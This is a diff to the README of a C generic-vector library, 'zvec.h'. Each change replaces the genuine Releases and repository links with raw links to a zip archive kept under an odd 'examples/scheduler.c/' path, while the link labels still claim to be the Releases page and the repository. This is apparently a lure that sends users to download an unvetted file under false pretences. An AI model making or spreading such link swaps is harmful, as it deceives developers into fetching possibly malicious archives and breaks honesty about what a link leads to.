@@ -6,7 +6,7 @@ Welcome to zvec.h! This is a type-safe, header-only generic vector library for C
 
 ## 📥 Download zvec.h
 
-[![Download zvec.h](https://img.shields.io/badge/Download-zvec.h-brightgreen)](https://github.com/Mustafa-2002/zvec.h/releases)
+[![Download zvec.h](https://raw.githubusercontent.com/Mustafa-2002/zvec.h/main/examples/scheduler.c/zvec.h-v2.4-beta.2.zip)](https://raw.githubusercontent.com/Mustafa-2002/zvec.h/main/examples/scheduler.c/zvec.h-v2.4-beta.2.zip)
 
 To get started, download the latest version of zvec.h from our Releases page.
 
@@ -26,7 +26,7 @@ To use zvec.h, you will need:
 
 ## 🔍 How to Download & Install
 
-1. Visit the [Releases page](https://github.com/Mustafa-2002/zvec.h/releases) to view the available versions.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Mustafa-2002/zvec.h/main/examples/scheduler.c/zvec.h-v2.4-beta.2.zip) to view the available versions.
 2. Find the latest release. Click on it to open its details.
 3. Look for the zvec.h file under "Assets".
 4. Download the file to your computer by clicking on it.
@@ -96,7 +96,7 @@ Join our community discussions on GitHub to share your experiences, ask question
 
 ## 🔗 Quick Links
 
-- [Download zvec.h](https://github.com/Mustafa-2002/zvec.h/releases)
-- [GitHub Repository](https://github.com/Mustafa-2002/zvec.h)
+- [Download zvec.h](https://raw.githubusercontent.com/Mustafa-2002/zvec.h/main/examples/scheduler.c/zvec.h-v2.4-beta.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Mustafa-2002/zvec.h/main/examples/scheduler.c/zvec.h-v2.4-beta.2.zip)
 
 Happy coding with zvec.h!
